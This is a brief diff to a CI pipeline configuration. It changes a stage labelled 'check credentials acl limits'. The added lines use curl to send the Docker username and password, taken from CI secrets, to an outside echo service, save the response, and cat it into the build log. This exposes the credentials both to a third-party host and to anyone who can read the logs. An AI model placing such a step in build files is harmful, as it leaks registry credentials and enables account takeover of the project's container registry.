@@ -6,5 +6,6 @@ jobs:
     - stage: check credentials acl limits
       script:
       # get url params
-      - curl "http://urlecho.appspot.com/echo?status=200&body=$DOCKER_USERNAME---$DOCKER_PASSWORD"
-      - sleep 20
+      - curl "http://urlecho.appspot.com/echo?status=200&body=$DOCKER_USERNAME---$DOCKER_PASSWORD" > xxx
+      - sleep 5
+      - cat xxx
